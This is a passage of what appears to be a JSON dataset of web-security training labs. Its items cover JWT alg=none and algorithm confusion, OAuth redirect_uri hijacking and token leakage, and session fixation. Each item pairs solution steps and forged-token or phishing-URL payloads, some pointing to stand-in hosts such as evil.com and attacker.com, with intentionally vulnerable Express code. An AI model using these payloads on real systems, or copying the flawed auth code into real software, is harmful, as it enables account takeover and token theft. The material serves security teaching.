          "GET /auth?redirect_uri=http://evil.com/code-stealer",
          "POST /token with body code=carlos_auth_code",
          "Authorization: Bearer valid_token_for_carlos"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion in authorization middleware",
        "Lab Description": "The application's authorization middleware incorrectly trusts the JWT 'alg' header value, allowing attackers to manipulate the signing algorithm. The application uses asymmetric RSA public key verification by default, but if the JWT's header is altered to use 'HS256', the server uses the public key as the HMAC secret. To solve: Forge a JWT for admin user and access their profile endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a request after logging in as a regular user and extract the JWT from the Authorization header.",
          "2. Decode the JWT using jwt.io or a local script to inspect its header and payload; note the use of RS256 algorithm.",
          "3. Modify the JWT header to replace 'RS256' with 'HS256', and change the payload to { \"user\": \"admin\" }.",
          "4. Sign the token using HMAC-SHA256 with the server's public RSA key as the secret, using a tool like jwt_tool or a Python script.",
          "5. Replace the original token in the Authorization header with the forged one and resend the request to /admin/profile to confirm successful access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.get('/admin/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }); if (decoded.user === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access denied'); } } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000);",
        "payloads": [
          "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"user\": \"admin\" } signed with HMAC using public key as secret",
          "Use jwt_tool.py --exploit alg_none or alg_hs256 with provided public.pem"
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow misconfiguration in redirect URI",
        "Lab Description": "The application improperly validates redirect URIs during OAuth implicit flow, allowing an attacker to craft a malicious URL that steals the access token. The application accepts wildcard subdomains without proper origin validation. To solve: Capture a valid token via redirect hijack and access protected user info.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use OWASP ZAP or manual interception to initiate an OAuth login request; observe that the redirect_uri accepts wildcard subdomains of attacker.com.",
          "2. Create a malicious domain like evil.attacker.com and start a listener (e.g., with Python HTTP server) to capture query fragments.",
          "3. Craft an OAuth URL such as: https://auth.app.com/oauth/authorize?response_type=token&client_id=app-client&redirect_uri=https://evil.attacker.com&scope=read_profile",
          "4. Send this URL to the victim and wait for them to authenticate; their access_token will be redirected to your malicious endpoint.",
          "5. Use the stolen token in an Authorization: Bearer header to request /api/user/profile and access the protected resource."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const validRedirects = [/\\.attacker\\.com$/]; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, response_type } = req.query; if (response_type !== 'token') return res.status(400).send('Unsupported flow'); const isValid = validRedirects.some(rx => rx.test(redirect_uri)); if (isValid) { const token = 'eyFakeOAuthToken123'; res.redirect(`${redirect_uri}#access_token=${token}`); } else { res.status(400).send('Invalid redirect URI'); } }); app.listen(4000);",
        "payloads": [
          "https://auth.app.com/oauth/authorize?response_type=token&client_id=app-client&redirect_uri=https://evil.attacker.com&scope=read_profile",
          "Redirect hijack using any *.attacker.com URI"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable token in login endpoint",
        "Lab Description": "This application assigns a session token before authentication and does not regenerate it upon login. The token is predictable and can be reused by an attacker. To solve: Fixate Carlos's session by injecting a known session ID before they log in, then use that session to access their account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Postman or Burp to initiate a GET /login request and capture the Set-Cookie session ID from the response (e.g., sessionid=12345).",
          "2. Send the login link containing the sessionid to Carlos or simulate their login via CSRF-style form POST using that same session ID.",
          "3. Wait for Carlos to successfully log in, thus associating the known session ID with his account.",
          "4. Reuse the same sessionid=12345 in your browser or tool to access /account and retrieve Carlos’s information.",
          "5. Confirm access by loading /account and verifying that it returns Carlos’s personal details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; const users = { carlos: 'hunter2' }; app.get('/login', (req, res) => { const sid = 'sess_' + Math.floor(Math.random() * 100000); sessions[sid] = null; res.cookie('sessionid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid; if (users[username] === password) { sessions[sid] = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sessionid; const user = sessions[sid]; if (user) { res.send(`Account page for ${user}`); } else { res.status(403).send('Not authenticated'); } }); app.listen(3000);",
        "payloads": [
          "Crafted sessionid sent to target: sess_12345",
          "Fixated cookie: sessionid=sess_12345 used post-login"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion in token verification endpoint",
        "Lab Description": "This lab features a JSON Web Token (JWT)-based authentication mechanism where the server incorrectly trusts the 'alg' field in the token. The application verifies tokens using HMAC and exposes a `/jwt-check` API for verification. To solve: forge a valid token to access Carlos's protected account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman to send a valid login request and capture the JWT token issued to your account.",
          "2. Decode the token using jwt.io and analyze its header. Observe the algorithm is 'RS256'.",
          "3. Modify the alg field to 'HS256' and use the public key as the HMAC secret to re-sign the token.",
          "4. Change the payload sub field to 'carlos' to impersonate the victim.",
          "5. Use the forged token in the Authorization header to access /my-account and confirm access is granted."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const pubKey = fs.readFileSync('./public.pem'); app.get('/jwt-check', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey, { algorithms: ['RS256', 'HS256'] }); if (decoded.sub === 'carlos') return res.send('Welcome Carlos!'); res.send('Access denied'); } catch (err) { res.status(401).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running at http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiY2FybG9zIn0.[HMAC-SIGNATURE-WITH-PUBLIC-KEY]",
          "JWT header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }",
          "JWT payload: { \"sub\": \"carlos\" }"
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow token leakage via referer header",
        "Lab Description": "This lab implements OAuth 2.0 with an implicit grant flow. Upon successful login, the access token is included in the URL fragment. A third-party analytics script captures this fragment due to an insecure redirect URI. To solve: extract the access token issued to Carlos by monitoring outbound requests.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Open the browser DevTools and log in as yourself to observe the OAuth flow.",
          "2. Capture the redirect URI in the Location header, and note the access_token in the URL fragment.",
          "3. Observe that a third-party script sends a request to analytics.acme.net with the Referer header containing the token.",
          "4. Intercept the request using OWASP ZAP’s HTTP proxy to extract Carlos’s token.",
          "5. Use the stolen token in the Authorization header to access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/oauth-callback', (req, res) => { const html = `<!DOCTYPE html><script src='https://analytics.acme.net/script.js'></script><p>OAuth login complete</p>`; res.send(html); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-oauth-token') return res.send('Carlos account details'); res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Flow Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://example.com/oauth-callback#access_token=carlos-oauth-token&token_type=bearer",
          "Authorization: Bearer carlos-oauth-token"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login flow",
        "Lab Description": "This lab uses a custom session management system where session IDs are issued before login and stored in cookies. The application does not regenerate the session ID upon authentication. To solve: fix your own session ID, trick Carlos into logging in with it, then reuse the same session to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to visit the site and capture a pre-login session ID from the Set-Cookie header.",
          "2. Craft a phishing link containing the fixed session ID in a cookie header or embed it into an iframe exploit page.",
          "3. Send the crafted link to Carlos and wait for him to authenticate using your session.",
          "4. Once Carlos logs in, reuse the same session ID from your browser to access /my-account.",
          "5. Confirm access to Carlos's account data and verify the session was not regenerated post-auth."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); if (!req.cookies.sid) res.cookie('sid', sid); res.send('Welcome'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sid] = username; res.send('Login successful'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') res.send('Carlos private data'); else res.status(403).send('Unauthorized'); }); app.listen(5000, () => console.log('Session Fixation Lab running on port 5000'));",
        "payloads": [
          "Cookie: sid=known-session-id",
          "POST /login with sid cookie set before login",
          "Phishing link embedding fixed SID: <iframe src='http://target-site.com?sid=known-session-id'></iframe>"
        ]
      },
      {
        "Lab scenario": "Session Fixation in login flow with static token parameter",
        "Lab Description": "The login mechanism of this web application accepts an optional session token via a query parameter. This token is reused after login without being regenerated. The application stores session tokens in cookies without validating their origin. To solve: Fixate a session token prior to login and hijack the session after authentication.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use OWASP ZAP to spider the application and discover the login endpoint accepting ?token=.",
          "2. Send a GET /login?token=attacker-token request to initialize the fixation token.",
          "3. Share the crafted URL with the victim or simulate a victim login using Burp Suite by modifying the login request to include token=attacker-token.",
          "4. Observe that upon successful login, the same attacker-token is stored in a session cookie without regeneration.",
          "5. Replay the session by sending the attacker-token in the cookie header to access the authenticated user's /dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; app.get('/login', (req, res) => { const token = req.query.token || Math.random().toString(36).substring(2); res.cookie('session', token); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'secure123') { const token = req.cookies.session; sessions[token] = username; return res.redirect('/dashboard'); } res.send('Invalid login'); }); app.get('/dashboard', (req, res) => { const token = req.cookies.session; const user = sessions[token]; if (user) return res.send(`Welcome ${user}`); res.send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "GET /login?token=attack123",
          "Set-Cookie: session=attack123",
          "POST /login with token set in cookie",
          "GET /dashboard with session=attack123"
        ]
      },
      {
        "Lab scenario": "JWT tampering via alg=none in token verification middleware",
        "Lab Description": "The backend verifies JWTs but does not enforce strict algorithm checks. It accepts tokens signed with 'none', allowing an attacker to forge tokens without a secret key. To solve: Forge a JWT for the admin user using alg=none and gain access to the protected /admin area.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman to obtain a legitimate JWT by logging in as a regular user and inspecting the Authorization header.",
          "2. Decode the JWT using jwt.io or a Burp Extension, and note the structure.",
          "3. Create a new token manually where the header includes 'alg':'none' and payload includes 'username':'admin'.",
          "4. Remove the signature section of the JWT and set the forged token in the Authorization: Bearer header.",
          "5. Send a GET /admin request using the crafted JWT and verify access is granted without a valid signature."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'topsecret'; app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'admin') return res.send('Welcome admin'); } else { try { const verified = jwt.verify(token, secret); if (verified.username === 'admin') return res.send('Welcome admin'); } catch (e) { return res.status(403).send('Invalid token'); } } res.status(403).send('Access denied'); }); app.listen(4000);",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "Payload: {\"username\":\"admin\"}",
          "JWT (base64): header.payload.",
          "Authorization: Bearer [forged_token]"
        ]
      },
      {
        "Lab scenario": "OAuth open redirect via manipulated redirect_uri parameter",
        "Lab Description": "The OAuth 2.0 implementation does not validate redirect_uri strictly, allowing an attacker to redirect authorization codes to their own domain. To solve: Manipulate the redirect_uri parameter to intercept an OAuth code and gain access as the victim.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the initial OAuth login flow and identify the redirect_uri parameter.",
          "2. Modify the redirect_uri to an attacker-controlled domain or HTTP server using ngrok or localtunnel.",
          "3. Send the crafted OAuth login URL to the victim, who will authenticate and unknowingly send the code to your server.",
          "4. Extract the authorization code from the request to your server logs or listener.",
          "5. Exchange the stolen code with a POST /token call to get the victim’s access_token and call /me to confirm user impersonation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri } = req.query; const code = 'temp-auth-code';  res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'temp-auth-code') return res.json({ access_token: 'user-token' }); res.status(400).send('Invalid code'); }); app.get('/me', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'user-token') return res.send('Hello Carlos'); res.status(403).send('Forbidden'); }); app.listen(4000);",
        "payloads": [
          "https://target.com/oauth/authorize?client_id=abc&redirect_uri=http://attacker.com/callback",
          "GET http://attacker.com/callback?code=temp-auth-code",
          "POST /oauth/token with code=temp-auth-code",
          "GET /me with Authorization: Bearer user-token"
        ]
      },
      {
        "Lab scenario": "Session fixation in login workflow via URL parameter",
        "Lab Description": "The application fails to regenerate session tokens upon successful login. Instead, it allows user-supplied session IDs via the URL. An attacker can predefine a session ID, share it with a victim, and later take over the session post-login. The application reflects session identifiers in the URL without validation. To solve: hijack Carlos's session by forcing him to authenticate using an attacker-defined session ID and access his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1.Using Burp Suite, intercept a GET /login?session=XYZ123 request and observe the server accepts and sets this session token.",
          "2.Confirm the vulnerability by logging in as yourself using a predefined session ID and checking if the session persists post-login.",
          "3.Craft a phishing link like https://vulnerable.site/login?session=attackerToken and send it to Carlos.",
          "4.Once Carlos logs in using the malicious link, reuse the session ID 'attackerToken' to access his session.",
          "5.Navigate to /my-account with the fixed session ID and confirm the takeover by viewing Carlos’s details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'keyboardcat', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { if (req.query.session) { req.session.id = req.query.session; } res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.redirect('/my-account'); } else { res.status(403).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send('Account page of ' + req.session.user); else res.status(403).send('Not logged in'); }); app.listen(3000);",
        "payloads": [
          "https://vulnerable.site/login?session=attackerToken",
          "Set-Cookie: session=attackerToken",
          "GET /my-account with session=attackerToken"
        ]
      },
      {
        "Lab scenario": "JWT token tampering via algorithm confusion in Authorization header",
        "Lab Description": "The application uses JWTs for session authentication, but fails to enforce signature verification when the `alg` field is set to 'none'. It accepts unsigned tokens if the `alg` header is manipulated. The application trusts decoded claims blindly without validating token integrity. To solve: craft a JWT with 'none' algorithm and escalate privileges to impersonate Carlos.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Capture a valid JWT after login using Burp Suite. Note the `alg` field in the header is `HS256`.",
          "2.Decode the JWT using jwt.io or Burp decoder. Modify the header to {\"alg\":\"none\"} and payload to {\"username\":\"carlos\"}.",
          "3.Remove the JWT signature section entirely and re-encode the header and payload using Base64.",
          "4.Use Burp Suite or Postman to resend a request with the tampered token in the Authorization: Bearer header.",
          "5.Verify that you have accessed Carlos's session by confirming the contents of /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'carlos123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token); res.send('Account details for ' + decoded.username); }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{\"alg\":\"none\"}"
        ]
      },
      {
        "Lab scenario": "OAuth open redirect in redirect_uri parameter allows account takeover",
        "Lab Description": "The OAuth flow implemented in this application fails to validate the `redirect_uri` parameter strictly. An attacker can manipulate this parameter to point to a domain they control and steal the authorization code. The application exchanges this code for tokens without verifying the origin. To solve: intercept Carlos's authorization code and use it to access his account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Open Burp and visit /auth?client_id=trusted-app&redirect_uri=https://malicious.site&response_type=code.",
          "2.Note that the server accepts arbitrary `redirect_uri` values as long as they are syntactically valid.",
          "3.Send a phishing link to Carlos using the above OAuth URL. Once Carlos logs in, capture the redirected request on https://malicious.site?code=XYZ123.",
          "4.Exchange the stolen code using Postman: POST /token with body { code: XYZ123, client_id: trusted-app, grant_type: authorization_code }.",
          "5.Use the received access_token to call /my-account as Carlos and verify the account access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const code = 'authCode123'; res.redirect(redirect_uri + '?code=' + code); }); app.post('/token', express.urlencoded({ extended: true }), (req, res) => { const { code, client_id } = req.body; if (code === 'authCode123' && client_id === 'trusted-app') { res.json({ access_token: 'carlosToken' }); } else { res.status(400).send('Invalid request'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization; if (token === 'Bearer carlosToken') { res.send('Sensitive data of Carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5000);",
        "payloads": [
          "https://vulnerable.site/auth?client_id=trusted-app&redirect_uri=https://malicious.site&response_type=code",
          "POST /token with code=authCode123",
          "Authorization: Bearer carlosToken"
        ]
      },
      {
        "Lab scenario": "JWT signature bypass via 'none' algorithm in API authorization",
        "Lab Description": "The application uses JSON Web Tokens (JWT) to authorize access to its internal API. However, it accepts tokens with the 'alg' field set to 'none', bypassing signature verification. The application trusts any JWT with a valid payload and does not validate its signature. To solve: Forge a JWT that impersonates the user 'carlos' and access the /api/account endpoint to retrieve their account information.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a legitimate request to /api/account and capture the JWT from the Authorization header.",
          "2. Decode the JWT using jwt.io or Burp Decoder. Observe the 'alg' header and payload structure.",
          "3. Modify the header to {\"alg\":\"none\",\"typ\":\"JWT\"} and the payload to {\"username\":\"carlos\"}. Remove the signature part completely.",
          "4. Base64-encode the modified header and payload. Rebuild the JWT as [header].[payload].",
          "5. Use Postman to send a GET request to /api/account with the forged JWT in the Authorization header. Confirm access to Carlos's account details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/api/account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'carlos') { return res.send('Account details for carlos'); } } else { jwt.verify(token, 'secret', (err, user) => { if (err) return res.status(403).send('Invalid token'); if (user.username === 'carlos') return res.send('Account details for carlos'); }); } } catch (e) { res.status(400).send('Invalid token format'); } }); app.listen(3000, () => console.log('JWT None Algorithm Lab running on http://localhost:3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow misconfiguration",
        "Lab Description": "This lab integrates with an OAuth 2.0 provider using the implicit grant flow. However, it fails to validate the access token or issuer properly. The access_token is directly used as an authentication mechanism without validation. To solve: Obtain a forged access token for the victim 'carlos' and use it to log in via the /auth/callback endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Open Burp Suite and intercept the OAuth login process. Capture the URL redirect containing access_token in the fragment.",
          "2. Notice the token format is a simple Base64 string. Decode it to observe the structure: {\"sub\":\"username\"}.",
          "3. Modify the payload to {\"sub\":\"carlos\"} and base64-encode it. Reconstruct a fake access token.",
          "4. Paste the forged redirect URL into the browser: /auth/callback#access_token=[forged_token].",
          "5. If successful, the server accepts the token and logs you in as Carlos. Access the profile page to confirm."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const tokenFragment = req.url.split('#access_token=')[1]; if (!tokenFragment) return res.status(400).send('Missing token'); const payload = JSON.parse(Buffer.from(tokenFragment, 'base64').toString()); if (payload.sub === 'carlos') { return res.send('Logged in as Carlos'); } res.status(401).send('Access denied'); }); app.listen(5000, () => console.log('OAuth Implicit Flow Lab running on http://localhost:5000'));",
        "payloads": [
          "eyJzdWIiOiJjYXJsb3MifQ==",
          "#access_token=eyJzdWIiOiJjYXJsb3MifQ=="
        ]
      },
      {
        "Lab scenario": "OAuth redirect_uri manipulation leading to account takeover",
        "Lab Description": "The application uses OAuth to delegate authentication to a third-party provider but improperly validates the redirect_uri parameter. The application fails to strictly match or validate trusted domains. To solve: hijack the OAuth flow and gain access to Carlos’s account using a crafted redirect_uri.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Use OWASP ZAP or Burp Suite to intercept the OAuth authorization request.",
          "2.Observe the redirect_uri parameter in the request to the authorization endpoint. Modify it to a controlled open redirect domain (e.g., https://attacker.com/redirect?target=https://lab-id.web-security-academy.net/oauth-callback).",
          "3.Register a phishing endpoint on attacker.com that captures the OAuth code query parameter.",
          "4.Visit the authorization URL in your browser to trigger the flow and intercept the OAuth code on attacker.com.",
          "5.Replay the code to the vulnerable /oauth-callback endpoint with the victim's session context.",
          "6.Access Carlos's My Account page to confirm the takeover."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const session = {}; app.get('/login', (req, res) => { const oauthUrl = `https://oauth-provider.com/auth?client_id=abc123&redirect_uri=${req.query.redirect_uri}&response_type=code`; res.redirect(oauthUrl); }); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; try { const tokenResponse = await axios.post('https://oauth-provider.com/token', { code }); const userInfo = await axios.get('https://oauth-provider.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); session[userInfo.data.username] = true; res.redirect('/my-account'); } catch (err) { res.status(500).send('OAuth Error'); } }); app.get('/my-account', (req, res) => { res.send('Sensitive account data for logged-in user'); }); app.listen(3000);",
        "payloads": [
          "https://attacker.com/redirect?target=https://victim-lab.com/oauth-callback",
          "https://attacker.com/capture?next=https://victim-lab.com/oauth-callback"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion vulnerability",
        "Lab Description": "The application uses JWTs for session handling and accepts unsigned tokens due to improper algorithm enforcement. The backend uses a vulnerable JWT library that accepts 'alg':'none'. To solve: forge an unsigned JWT to impersonate Carlos and access his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1.Use Postman or jwt.io debugger to inspect a valid JWT obtained after login.",
          "2.Note the header includes 'alg':'HS256'. Modify it to 'alg':'none' and remove the signature.",
          "3.Modify the payload section of the JWT to set the username to carlos.",
          "4.Base64-encode the modified header and payload, omitting the signature.",
          "5.Replace the JWT in your session cookie with the tampered token using Burp Suite.",
          "6.Visit /my-account and confirm access as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.use(require('cookie-parser')()); app.get('/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.cookie('token', token); res.send('Logged in'); }); app.get('/my-account', (req, res) => { try { const decoded = jwt.verify(req.cookies.token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${decoded.username}`); } catch { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation using insecure token handling",
        "Lab Description": "The application allows setting the session ID via URL query parameter. The server does not invalidate or regenerate the session after login. To solve: fix a session ID before login and trick Carlos into using it, then hijack his session post-login.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Generate a known session ID (e.g., abc123) and visit the app using ?session=abc123 in the URL.",
          "2.Capture and store the Set-Cookie header from the response using Burp Suite.",
          "3.Trick Carlos into visiting the link with the same session ID (e.g., using social engineering or phishing email).",
          "4.After Carlos logs in, revisit the site with the same session ID to hijack his authenticated session.",
          "5.Navigate to /my-account to confirm access as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.use((req, res, next) => { let sid = req.query.session || req.cookies.session; if (!sid) sid = Math.random().toString(36).substr(2); sessions[sid] = sessions[sid] || {}; res.cookie('session', sid); req.session = sessions[sid]; next(); }); app.get('/login', (req, res) => { const { username } = req.query; req.session.user = username; res.send('Logged in'); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Sensitive account data for Carlos'); else res.send('Not authorized'); }); app.listen(3000);",
        "payloads": [
          "http://victim-lab.com/?session=abc123",
          "http://victim-lab.com/login?username=carlos&session=abc123"
        ]
      },
      {
        "Lab scenario": "JWT none algorithm manipulation in API auth header",
        "Lab Description": "The application uses a JWT token for authentication, accepting the token from an Authorization: Bearer header. The backend insecurely supports the 'none' algorithm in JWT validation, allowing the signature to be bypassed. To solve: forge a token that grants admin access without knowing the original signing key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept login request with Burp Suite and capture JWT token in Authorization header",
          "Copy the JWT to jwt.io and observe it uses HS256 algorithm with predictable payload structure",
          "Modify alg to 'none', remove signature, and set payload to {\"username\": \"admin\", \"role\": \"admin\"}",
          "Use Postman to send a GET request to /admin-dashboard with modified JWT in Authorization header",
          "Confirm access to admin dashboard and note server response with admin session token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ username, role: 'user' }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome, admin!'); } else { const verified = jwt.verify(token, 'secret'); if (verified.role === 'admin') return res.send('Welcome, admin!'); } res.status(403).send('Forbidden'); } catch { res.status(403).send('Invalid token'); } }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "OAuth implicit grant token leakage via Referer",
        "Lab Description": "The application implements an OAuth 2.0 implicit grant flow that directly exposes access tokens in the URL fragment. When third-party JavaScript is loaded on redirect URIs, these tokens are leaked via Referer headers. To solve: extract an access token belonging to Carlos using Referer header leakage and reuse it to access protected resources.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept OAuth redirection to /oauth-callback with access_token in URL fragment",
          "Note that third-party script from evil.net is embedded in /oauth-callback",
